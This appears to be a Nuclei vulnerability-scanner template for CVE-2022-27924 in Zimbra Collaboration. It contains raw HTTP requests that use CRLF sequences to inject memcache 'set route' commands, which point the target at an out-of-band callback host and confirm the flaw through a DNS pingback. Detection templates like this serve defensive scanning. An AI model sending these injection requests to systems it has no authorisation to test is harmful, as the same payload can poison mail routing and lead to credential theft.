id: CVE-2022-27924

info:
  name: Zimbra Collaboration Memcached Poisoning via CRLF Injection
  author: dwisiswant0
  severity: high
  description: |
    Zimbra Collaboration (aka ZCS) 8.8.15 and 9.0 allows an
    unauthenticated attacker to inject arbitrary memcache commands
    into a targeted instance. These memcache commands becomes
    unescaped, causing an overwrite of arbitrary cached entries.
    This template is only for executing trigger exploits by tracking
    DNS pingbacks, for stealing cleartext credentials see reference[2].
  reference:
    - https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P31.1
    - https://blog.sonarsource.com/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/
  tags: cve,cve2022,crlf,zimbra,memcached

variables:
  data: "{{interactsh-url}}:{{rand_text_numeric(4)}}"
  size: "{{len(data)}}"
  user: "{{to_lower(rand_text_alphanumeric(8))}}"

requests:
  - raw:
      - |+
        GET /service/home/{{to_lower(rand_text_alpha(8))}}\r\nset+route:proto=httpssl;user={{user}}@{{Host}}+0+60+{{size}}\r\n{{data}}\r\n/file HTTP/1.1
        Host: {{Hostname}}
        Connection: close

      - |+ # First pingback attempt
        GET /service/home/{{user}}/file HTTP/1.1
        Host: {{Hostname}}
        Connection: close

      - |+ # Retry to trigger & avoid misfire, MX could be from root, not from _Host_ that possibly subdomain. We never know the backend. :shrug:
        GET /service/home/{{to_lower(rand_text_alpha(8))}}\r\nget+route:proto=httpssl;user={{user}}@{{Host}}\r\n/file HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    unsafe: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"